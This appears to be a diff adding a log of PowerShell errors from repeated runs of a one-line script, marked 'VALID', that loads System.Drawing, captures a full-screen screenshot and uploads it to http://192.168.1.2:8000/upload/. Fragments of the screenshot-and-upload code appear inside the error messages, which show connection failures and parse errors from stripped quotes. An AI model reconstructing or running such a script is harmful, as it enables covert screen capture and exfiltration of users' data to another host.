@@ -1,1 +1,73 @@
 
+VALID 
+Invoke-WebRequest : Unable to connect to the remote server
+At line:1 char:1
++ Invoke-WebRequest -UseBasicParsing -Uri http://192.168.1.2:8000/uploa ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : System.Net.WebException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+ 
+VALID 
+At line:1 char:44
++ [Reflection.Assembly]::LoadWithPartialName(System.Drawing) function s ...
++                                            ~
+Missing ')' in method call.
+At line:1 char:44
++ [Reflection.Assembly]::LoadWithPartialName(System.Drawing) function s ...
++                                            ~~~~~~~~~~~~~~
+Unexpected token 'System.Drawing' in expression or statement.
+At line:1 char:58
++ [Reflection.Assembly]::LoadWithPartialName(System.Drawing) function s ...
++                                                          ~
+Unexpected token ')' in expression or statement.
+At line:1 char:381
++ ...  $graphics.Dispose() $bmp.Dispose() } $ip = 192.168.1.2 $port = 8000  ...
++                                                             ~~~~~
+Unexpected token '$port' in expression or statement.
+At line:1 char:394
++ ... ispose() } $ip = 192.168.1.2 $port = 8000 $uploadFunctionPath = (http ...
++                                               ~~~~~~~~~~~~~~~~~~~
+Unexpected token '$uploadFunctionPath' in expression or statement.
+At line:1 char:459
++ ... tionPath = (http + ':' + //$ip + ':' + $port/upload/) $bounds = [Draw ...
++                                                           ~~~~~~~
+Unexpected token '$bounds' in expression or statement.
+At line:1 char:517
++ ...  = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080) screenshot $bounds ...
++                                                        ~~~~~~~~~~
+Unexpected token 'screenshot' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall
+ 
+VALID 
+At line:1 char:44
++ [Reflection.Assembly]::LoadWithPartialName(System.Drawing) function s ...
++                                            ~
+Missing ')' in method call.
+At line:1 char:44
++ [Reflection.Assembly]::LoadWithPartialName(System.Drawing) function s ...
++                                            ~~~~~~~~~~~~~~
+Unexpected token 'System.Drawing' in expression or statement.
+At line:1 char:58
++ [Reflection.Assembly]::LoadWithPartialName(System.Drawing) function s ...
++                                                          ~
+Unexpected token ')' in expression or statement.
+At line:1 char:381
++ ...  $graphics.Dispose() $bmp.Dispose() } $ip = 192.168.1.2 $port = 8000  ...
++                                                             ~~~~~
+Unexpected token '$port' in expression or statement.
+At line:1 char:394
++ ... ispose() } $ip = 192.168.1.2 $port = 8000 $uploadFunctionPath = (http ...
++                                               ~~~~~~~~~~~~~~~~~~~
+Unexpected token '$uploadFunctionPath' in expression or statement.
+At line:1 char:459
++ ... tionPath = (http + ':' + //$ip + ':' + $port/upload/) $bounds = [Draw ...
++                                                           ~~~~~~~
+Unexpected token '$bounds' in expression or statement.
+At line:1 char:517
++ ...  = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080) screenshot $bounds ...
++                                                        ~~~~~~~~~~
+Unexpected token 'screenshot' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall
+ 
